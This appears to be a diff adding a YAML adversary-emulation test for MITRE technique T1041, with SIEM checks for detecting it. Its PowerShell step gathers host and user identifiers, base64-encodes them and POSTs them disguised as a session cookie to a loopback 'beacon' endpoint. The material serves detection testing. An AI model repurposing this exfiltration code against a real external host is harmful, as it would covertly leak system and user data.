@@ -1,0 +1,98 @@
+id: T1041_exfiltration_over_c2_channel
+name: "Exfiltration Over C2 Channel"
+mitre_technique: "T1041"
+mitre_tactic: "exfiltration"
+description: >
+  Adversaries exfiltrate stolen data through the same channel used for command and
+  control — typically HTTP/S or DNS. Data is embedded in the normal C2 communication
+  stream, encoded to blend with existing traffic. This is the simplest exfiltration
+  method: it requires no additional infrastructure and uses already-established
+  connectivity. Data may be split across multiple C2 check-ins, embedded in HTTP
+  response bodies to operator callbacks, or transmitted as large POST bodies.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1041/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1041 — Exfiltration Over C2 Channel simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate C2 check-in with embedded exfil data"
+    command: |
+      # Create collected data to exfiltrate
+      $collected = "$env:TEMP\PAS_T1041_collected.txt"
+      @"
+PAS-T1041-COLLECTED-DATA
+HOSTNAME=$env:COMPUTERNAME
+USERNAME=$env:USERNAME
+DOMAIN=$env:USERDOMAIN
+TIME=$(Get-Date -Format o)
+"@ | Set-Content $collected
+
+      $encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes($collected))
+      Write-Host "[PAS] Collected data encoded: $($encoded.Length) chars"
+
+      Write-Host "[PAS] C2 check-in with embedded exfil (loopback):"
+      # Simulate C2 beacon POST with data in body — same channel as control
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1:8080/beacon")
+          $req.Method = "POST"
+          $req.ContentType = "application/x-www-form-urlencoded"
+          $req.Timeout = 500
+          # Data encoded to look like a session cookie value
+          $body = [Text.Encoding]::UTF8.GetBytes("sid=PAS_SESSION&d=$encoded&t=$(Get-Date -UFormat %s)")
+          $req.ContentLength = $body.Length
+          $s = $req.GetRequestStream()
+          $s.Write($body, 0, $body.Length)
+          $s.Close()
+          $req.GetResponse() | Out-Null
+          Write-Host "[PAS] C2 beacon POST with exfil data sent to 127.0.0.1:8080"
+      } catch {
+          Write-Host "[PAS] C2 beacon POST attempted (no listener — expected)"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate large data upload through C2 in chunks"
+    command: |
+      Write-Host "[PAS] Large data exfil through C2 channel:"
+      Write-Host "[PAS] Pattern: periodic large POST bodies during 'check-in' intervals"
+      Write-Host "[PAS] Detection signal: C2 beacon transitions from small to large POST bodies"
+      Write-Host "[PAS] Volume anomaly: normal beacon = <1KB, exfil beacon = 100KB+"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — HTTP POST body size spike during existing beacon session, base64 in POST body"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove collected data file"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1041_collected.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] C2 exfil artifacts removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1041 cleanup complete"
+
+analyst_checklist:
+  - "Network event: existing periodic HTTP session transitions to large POST bodies"
+  - "Network: base64-encoded content in POST body of C2 beacon requests"
+  - "Sentinel: DeviceNetworkEvents | where SentBytes > 100000 and ActionType == 'ConnectionSuccess' and InitiatingProcessFileName == 'powershell.exe'"
+  - "MDE alert: 'Data exfiltration over C2 channel — beacon volume anomaly'"
+  - "CONTROL CHECK: Egress proxy with DLP — TLS inspection on all outbound HTTPS enables content inspection"
+  - "CONTROL CHECK: Volume-based alerting: process uploading >10MB in single session to unknown IP triggers alert"
